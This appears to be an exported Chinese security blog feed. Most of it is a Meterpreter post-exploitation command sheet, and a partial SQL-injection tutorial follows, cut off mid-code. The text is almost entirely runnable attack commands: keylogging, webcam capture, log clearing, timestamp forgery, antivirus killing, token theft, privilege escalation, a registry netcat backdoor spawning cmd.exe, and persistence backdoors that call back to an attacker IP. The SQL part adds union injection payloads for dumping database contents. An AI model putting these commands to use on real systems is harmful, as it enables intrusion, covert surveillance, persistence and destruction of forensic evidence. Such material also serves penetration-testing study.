#查看当前进程的pidsysinfo #查看目标主机系统信息ps #查看当前活跃进程 kill &lt;PId&gt; 杀死进程idletime #查看目标计算机闲置时间reboot &#x2F; shutdown  #重启&#x2F;关机shell #进入目标 cmd shel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-开关键盘-鼠标"><a href="#4-2-开关键盘-鼠标" class="headerlink" title="4.2 开关键盘/鼠标"></a>4.2 开关键盘/鼠标</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">uictl [enable&#x2F;disable] [keyboard&#x2F;mouse&#x2F;all] #开启或禁止键盘&#x2F;鼠标<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-3-摄像头命令"><a href="#4-3-摄像头命令" class="headerlink" title="4.3 摄像头命令"></a>4.3 摄像头命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">webcam_list  #查看摄像头webcam_snap   #通过摄像头拍照webcam_stream   #通过摄像头开启视频<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-4-执行文件"><a href="#4-4-执行文件" class="headerlink" title="4.4 执行文件"></a>4.4 执行文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; execute Usage: execute -f file [options]Executes a command on the remote machine.OPTIONS:    -H        Create the process hidden from view.    -a &lt;opt&gt;  The arguments to pass to the command.    -c        Channelized I&#x2F;O (required for interaction).    -d &lt;opt&gt;  The &#39;dummy&#39; executable to launch when using -m.    -f &lt;opt&gt;  The executable command to run.    -h        Help menu.    -i        Interact with the process after creating it.    -k        Execute process on the meterpreters current desktop    -m        Execute from memory.    -s &lt;opt&gt;  Execute process in a given session as the session user    -t        Execute process with currently impersonated thread token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-5-进程迁移"><a href="#4-5-进程迁移" class="headerlink" title="4.5 进程迁移"></a>4.5 进程迁移</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; migrateUsage: migrate &lt;&lt;pid&gt; | -P &lt;pid&gt; | -N &lt;name&gt;&gt; [-t timeout]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getpid    # 获取当前进程的pidps   # 查看当前活跃进程migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt;   #杀死进程注意 只有相同进程权限的启动程序可以注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-5-日志清理"><a href="#4-5-日志清理" class="headerlink" title="4.5 日志清理"></a>4.5 日志清理</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">clearev #清除windows中的应用程序日志、系统日志、安全日志，需要管理员权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-6-基础文件系统命令"><a href="#4-6-基础文件系统命令" class="headerlink" title="4.6 基础文件系统命令"></a>4.6 基础文件系统命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getwd 或者pwd # 查看当前工作目录  lscdcat c:\\lltest\\lltestpasswd.txt  # 查看文件内容upload &#x2F;tmp&#x2F;hack.txt C:\\lltest  # 上传文件到目标机上download c:\\lltest\\lltestpasswd.txt &#x2F;tmp&#x2F; # 下载文件到本机上edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件rm C:\\lltest\\hack.txtmkdir lltest2  #只能在当前目录下创建文件夹rmdir lltest2  #只能删除当前目录下文件夹getlwd   或者 lpwd   #操作攻击者主机 查看当前目录lcd &#x2F;tmp   #操作攻击者主机 切换目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-7-伪造时间戳"><a href="#4-7-伪造时间戳" class="headerlink" title="4.7 伪造时间戳"></a>4.7 伪造时间戳</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; timestomp c:&#x2F;&#x2F;Usage: timestomp &lt;file(s)&gt; OPTIONSOPTIONS:    -a &lt;opt&gt;  #设置文件的“上次访问”时间    -b        #设置MACE时间戳，使EnCase显示空白    -c &lt;opt&gt;  #设置文件的“创建”时间    -e &lt;opt&gt;  #设置文件的“mft entry modified”时间    -f &lt;opt&gt;  #将属性的MACE设置为与提供的文件相同    -h        Help banner    -m &lt;opt&gt;  #设置文件的“上次写入”时间    -r        #在目录上递归设置MACE时间戳    -v        #显示文件的UTC MACE值    -z &lt;opt&gt;  #设置文件的所有四个属性（MACE）例：timestomp -v C:&#x2F;&#x2F;2.txt   #查看时间戳timestomp C:&#x2F;&#x2F;2.txt -f C:&#x2F;&#x2F;1.txt #将1.txt的时间戳复制给2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-8-搜索文件"><a href="#4-8-搜索文件" class="headerlink" title="4.8 搜索文件"></a>4.8 搜索文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; search -hUsage: search [-d dir] [-r recurse] -f pattern [-f pattern]...Search for files.OPTIONS:    -d &lt;opt&gt;  #开始搜索的目录&#x2F;驱动器。留空以搜索所有驱动器(默认值：）    -f &lt;opt&gt;  #要搜索的文件模式glob(e、 g.*秘密*.doc？）    -h        Help Banner    -r &lt;opt&gt;  #递归搜索子目录(默认值：true）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-9-网络命令"><a href="#4-9-网络命令" class="headerlink" title="4.9 网络命令"></a>4.9 网络命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig&#x2F;ifconfignetstat –anoarpgetproxy   #查看代理信息route   #查看路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-10-端口转发"><a href="#4-10-端口转发" class="headerlink" title="4.10 端口转发"></a>4.10 端口转发</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS:    -L &lt;opt&gt;  #转发：要侦听的本地主机（可选）。反向：要连接的本地主机。    -R        #表示反向端口正向。    -h        Help banner.    -i &lt;opt&gt;  #要与之交互的端口转发条目的索引（请参阅“list”命令）。    -l &lt;opt&gt;  #转发：要侦听的本地端口。反向：要连接的本地端口    -p &lt;opt&gt;  #转发：要连接的远程端口。反向：监听的远程端口。    -r &lt;opt&gt;  #转发：要连接到的远程主机。例：portfwd add -l 6666 -p 3389 -r 127.0.0.1#将目标机的3389端口转发到本地6666端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-11-添加路由"><a href="#4-11-添加路由" class="headerlink" title="4.11 添加路由"></a>4.11 添加路由</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run autoroute -h[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Usage:   run autoroute [-r] -s subnet -n netmask[*] Examples:[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1&#x2F;255.255.255.0[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0[*]   run autoroute -s 10.10.10.1&#x2F;24              # CIDR notation is also okay[*]   run autoroute -p                            # Print active routing table[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1&#x2F;255.255.255.0 route[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes例：run autoroute -s 192.168.159.0&#x2F;24  #添加到目标环境网络run autoroute –p  #查看添加的路由#利用arp_scanner\portscan 进行扫描run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;run auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp RHOSTS&#x3D;  PORTS&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-12-Socks4a代理"><a href="#4-12-Socks4a代理" class="headerlink" title="4.12 Socks4a代理"></a>4.12 Socks4a代理</h3><p><code>autoroute</code>添加完路由后，还可以利用<strong>msf</strong>自带的<code>sock4a</code>模块进行<code>Socks4a</code>代理</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msf&gt; use auxiliary&#x2F;server&#x2F;socks4a msf &gt; set srvhost 127.0.0.1msf &gt; set srvport 1080msf &gt; runvi &#x2F;etc&#x2F;proxychains.conf #添加 socks4 127.0.0.1 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-13-信息收集"><a href="#4-13-信息收集" class="headerlink" title="4.13 信息收集"></a>4.13 信息收集</h3><p>位置：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;gather&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;linux&#x2F;gather#常用脚本run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息run post&#x2F;windows&#x2F;gather&#x2F;dumplinks   #获取最近的文件操作run post&#x2F;windows&#x2F;gather&#x2F;enum_ie  #获取IE缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome   #获取Chrome缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-14-提权"><a href="#4-14-提权" class="headerlink" title="4.14 提权"></a>4.14 提权</h3><h4 id="4-14-1-getsystem"><a href="#4-14-1-getsystem" class="headerlink" title="4.14.1 getsystem"></a>4.14.1 getsystem</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getsystem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>getsystem</code>创建一个新的<strong>Windows</strong>服务，设置为<strong>SYSTEM</strong>运行，当它启动时连接到一个命名管道。</li><li><code>getsystem</code>产生一个进程，它创建一个命名管道并等待来自该服务的连接。</li><li><strong>Windows</strong>服务已启动，导致与命名管道建立连接。</li><li>该进程接收连接并调用<code>ImpersonateNamedPipeClient</code>，从而为<strong>SYSTEM</strong>用户创建模拟令牌。</li></ul><p>然后用新收集的<strong>SYSTEM</strong>模拟令牌产生<strong>cmd.exe</strong>，并且我们有一个<strong>SYSTEM</strong>特权进程。</p><h4 id="4-14-2-bypassuac-rb"><a href="#4-14-2-bypassuac-rb" class="headerlink" title="4.14.2 bypassuac.rb"></a>4.14.2 bypassuac.rb</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bypassuac#内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：use exploit&#x2F;windows&#x2F;local&#x2F;bypassuacuse exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionuse windows&#x2F;local&#x2F;bypassuac_vbsuse windows&#x2F;local&#x2F;ask如使用bypassuac.rb脚本：msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuacmsf &gt; set SESSION 2msf &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-14-3-内核漏洞提权"><a href="#4-14-3-内核漏洞提权" class="headerlink" title="4.14.3 内核漏洞提权"></a>4.14.3 内核漏洞提权</h4><p>可先利用enum_patches模块收集补丁信息，然后查找可用的exploits进行提权，需要退出当前连接</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #查看补丁信息msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_schlampereimsf &gt; set SESSION 2msf &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-15-远程桌面-截图"><a href="#4-15-远程桌面-截图" class="headerlink" title="4.15 远程桌面/截图"></a>4.15 远程桌面/截图</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">enumdesktops  #查看可用的桌面getdesktop    #获取当前meterpreter 关联的桌面set_desktop   #设置meterpreter关联的桌面  -h查看帮助screenshot  #截屏use espia  #或者使用espia模块截屏  然后输入screengrabrun vnc  #使用vnc远程桌面连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-16-rdp-用户添加"><a href="#4-16-rdp-用户添加" class="headerlink" title="4.16 rdp/用户添加"></a>4.16 rdp/用户添加</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run getgui –h[!] Meterpreter scripts are deprecated. Try post&#x2F;windows&#x2F;manage&#x2F;enable_rdp.[!] Example: run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp OPTION&#x3D;value [...]Windows Remote Desktop Enabler Meterpreter ScriptUsage: getgui -u &lt;username&gt; -p &lt;password&gt;Or:    getgui -eOPTIONS:    -e        Enable RDP only.    -f &lt;opt&gt;  Forward RDP Connection.    -h        Help menu.    -p &lt;opt&gt;  The Password of the user to add.    -u &lt;opt&gt;  The Username of the user to add.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#1run getgui -e #开启远程桌面run getgui -u lltest2 -p 123456   #添加用户run getgui -f 6661 –e   #3389端口转发到6661#2run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-17-键盘记录"><a href="#4-17-键盘记录" class="headerlink" title="4.17 键盘记录"></a>4.17 键盘记录</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">keyscan_start  #开始键盘记录keyscan_dump   #导出记录数据keyscan_stop #结束键盘记录这边要说一点就是，导出记录的话要在keyscan_stop命令之前，不然结束了就无法导出了meterpreter &gt; keyscan_startStarting the keystroke sniffer ...meterpreter &gt; keyscan_dump  #每次转储后，命令都会打印出来，然后再次转储的话是从上一次键盘结束开始记录的Dumping captured keystrokes...fffff&lt;CR&gt;&lt;CR&gt;&lt;CR&gt;fff&lt;CR&gt;&lt;CR&gt;&lt;CR&gt;meterpreter &gt; keyscan_stopStopping the keystroke sniffer...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-18-sniffer-抓包"><a href="#4-18-sniffer-抓包" class="headerlink" title="4.18 sniffer 抓包"></a>4.18 sniffer 抓包</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use sniffersniffer_interfaces   #查看网卡sniffer_start 2   #选择网卡 开始抓包sniffer_stats 2   #查看状态sniffer_dump 2 &#x2F;tmp&#x2F;lltest.pcap  #导出pcap数据包sniffer_stop 2   #停止抓包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-注册表操作"><a href="#5-注册表操作" class="headerlink" title="5  注册表操作"></a>5  注册表操作</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter reg –hUsage: reg [command] [options]Interact with the target machine&#39;s registry.OPTIONS:    -d &lt;opt&gt;  The data to store in the registry value.#注册表中值的数据    -h        Help menu.    -k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).#注册表键路径    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials#要连接的远程计算机名称（使用当前进程凭据）    -t &lt;opt&gt;  The registry value type (E.g. REG_SZ).#注册表值类型    -v &lt;opt&gt;  The registry value name (E.g. Stuff).#注册表键名称    -w        Set KEY_WOW64 flag, valid values [32|64].#设置32位注册列表还是64位COMMANDS:    enumkey  Enumerate the supplied registry key [-k &lt;key&gt;]#枚举可获得的键    createkey  Create the supplied registry key  [-k &lt;key&gt;]#创建提供的注册表项    deletekey  Delete the supplied registry key  [-k &lt;key&gt;]#删除提供的注册表项    queryclass Queries the class of the supplied key [-k &lt;key&gt;]#查询键值数据    setval Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]#设置键值    deleteval  Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]#删除提供的注册表值    queryval Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]#查询值的数据内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注册表设置nc后门</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">upload &#x2F;Users&#x2F;ascotbe&#x2F;Downloads&#x2F;netcat-1.11&#x2F;nc.exe C:\\windows\\system32 #上传nc,前面的是你要上传文件的位置reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的keyreg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#39;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#39; #设置键值reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值nc -v 192.168.0.142 443  #攻击者连接nc后门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-令牌操纵"><a href="#6-令牌操纵" class="headerlink" title="6.令牌操纵"></a>6.令牌操纵</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#假冒令牌use incognito      help incognito  #查看帮助list_tokens -u    #查看可用的tokenimpersonate_token &#39;NT AUTHORITY\SYSTEM&#39;  #假冒SYSTEM token,或者用下面的impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\execute -f cmd.exe -i –t    # -t 使用假冒的token 执行或者直接shellrev2self   #返回原始token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>steal_token 窃取令牌</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; steal_tokenUsage: steal_token [pid]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="7-关闭杀软"><a href="#7-关闭杀软" class="headerlink" title="7 关闭杀软"></a>7 关闭杀软</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run killav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-后门植入"><a href="#8-后门植入" class="headerlink" title="8 后门植入"></a>8 后门植入</h2><h5 id="persistence启动项后门"><a href="#persistence启动项后门" class="headerlink" title="persistence启动项后门"></a>persistence启动项后门</h5><p>在<code>C:\Users\XXXXX\AppData\Local\Temp\</code>目录下，上传一个<strong>vbs</strong>脚本<br>在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项</p><pre class="line-numbers language-none"><code class="language-none">BASHrun persistence –h  #查看帮助run persistence -X -i 5 -p 6661 -r 192.168.159.134#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>连接后门</strong></p><pre class="line-numbers language-none"><code class="language-none">BASHmsf &gt; use exploit&#x2F;multi&#x2F;handlermsf &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcpmsf &gt; set LHOST 192.168.159.134msf &gt; set LPORT 6661msf &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h4><p>在<code>C:\Users\XXXXX\AppData\Local\Temp\</code>上传了三个文件（<strong>metsrv.x86.dll</strong>、<strong>metsvc-server.exe</strong>、<strong>metsvc.exe</strong>），通过服务启动，服务名为<strong>meterpreter</strong></p><pre class="line-numbers language-none"><code class="language-none">BASHrun metsvc –h   # 查看帮助run metsvc –A   #自动安装后门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>连接后门</strong></p><pre class="line-numbers language-none"><code class="language-none">BASHmsf &gt; use exploit&#x2F;multi&#x2F;handlermsf &gt; set payload windows&#x2F;metsvc_bind_tcpmsf &gt; set RHOST 192.168.159.144msf &gt; set LPORT 31337msf &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考链接</p><p>：<a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></p><p>：<a href="https://www.ascotbe.com/2020/05/06/MeterpreterCommand/">https://www.ascotbe.com/2020/05/06/MeterpreterCommand/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入基础</title>
      <link href="2020/07/12/sql-zhu-ru-ji-chu/"/>
      <url>2020/07/12/sql-zhu-ru-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h1><span id="more"></span><h2 id="1-1基于mysql的sql注入"><a href="#1-1基于mysql的sql注入" class="headerlink" title="1. 1基于mysql的sql注入"></a>1. 1基于mysql的sql注入</h2><h3 id="1-1-1-SQL注入形成原因"><a href="#1-1-1-SQL注入形成原因" class="headerlink" title="1.1.1 SQL注入形成原因"></a>1.1.1 SQL注入形成原因</h3><p>sql注入是开发者没有对用户的输入数据进行严格的限制，转义，致使用户在输入一些特定字符时，在与后端 设定的sq语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信；</p><h3 id="1-1-2常见的登录查询代码"><a href="#1-1-2常见的登录查询代码" class="headerlink" title="1.1.2常见的登录查询代码"></a>1.1.2常见的登录查询代码</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token keyword">user</span><span class="token punctuation">`</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$username'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$password'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录成功的判断逻辑不尽相同，但是都建立在sql语句能够查询出来结果的前提上的</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#提交 username=admin&amp;password=123456</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token comment">#提交 username=xxx'or 1=1 #&amp;password=xxx</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'xxx'</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#'and password='xxx'</span><span class="token comment">#  #号是注释符，由于1=1 恒成立，使得该语句等价 select * from </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-3-union-order-by-注入"><a href="#1-1-3-union-order-by-注入" class="headerlink" title="1.1.3 union/order by 注入"></a>1.1.3 union/order by 注入</h3><p>执行以下语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">#union 后的select 语句取出的列数必须与uinon前取出的相同</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment"># 使用order by 获取原来语句的select 的列数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2020/07/12/sql-zhu-ru-ji-chu/image-20210424115914985.png" class="slug"><h3 id="1-1-4-数据库信息的获取"><a href="#1-1-4-数据库信息的获取" class="headerlink" title="1.1.4 数据库信息的获取"></a>1.1.4 数据库信息的获取</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token string">'union select database(),2,3 #'</span> 获取当前数据库 xxx <span class="token string">'union select user(),2,3 # '</span>  获取当前用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#利用mysql自带的库 information_schema,这个库存储了mysql的全部信息，可以获取某个数据库的表名和列名</span><span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schma<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xxx' <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token number">0x637466</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（1） group_concat函数的作用是把一列的数据用逗号拼接</p><p>（2）information_schema.tables 是指information_schema库下的tables表；where语句只是为了取出当前数据库的表，否则表名会很多</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">取列名xxx&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&#39;flag&#39; #xxx&#39; union select group_concat(flag),2,3 from flag如果information_schema被过滤掉，还有以下的库可以取得表名：sys.schema_auto_increment_columns的table_name列，存在table_schemasys.schema_table_statistics_with_buffer的table_name列，存在table_schemamysql.innodb_table_stats的table_name列，存在database_namemysql.innodb_index_stats的table_name列，存在database_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">where</span> id<span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">SELECT</span> <span class="token keyword">DATABASE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span>  取当前数据库的库名<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> card <span class="token keyword">where</span> id<span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">SELECT</span> <span class="token keyword">USER</span><span class="token punctuation">(</span><span class="token 